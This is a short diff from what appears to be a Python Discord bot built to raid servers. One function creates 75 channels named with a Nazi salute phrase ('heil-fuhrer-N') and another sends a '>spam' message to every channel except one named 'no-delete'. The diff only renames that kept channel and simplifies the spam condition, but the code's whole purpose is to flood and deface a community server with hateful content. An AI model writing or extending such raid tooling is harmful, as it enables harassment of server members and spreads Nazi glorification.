@@ -77,7 +77,7 @@ https://cdn.discordapp.com/attachments/693974529923612728/708740617496428604/158
         print(')\n')
 
     async def make_channels(self, ctx):
-        await ctx.guild.create_text_channel(f"no-spam")
+        await ctx.guild.create_text_channel("no-delete")
         for i in range(75):
             try:
                 await ctx.guild.create_text_channel(f"heil-fuhrer-{i+1}")
@@ -93,7 +93,7 @@ https://cdn.discordapp.com/attachments/693974529923612728/708740617496428604/158
 
     async def spam_all_channels(self, ctx):
         for channel in ctx.guild.channels:
-            if not channel.name == 'no-spam' or not channel.name == 'no-delete':
+            if not channel.name == 'no-delete':
                 await channel.send(">spam")
 
     @commands.Cog.listener()
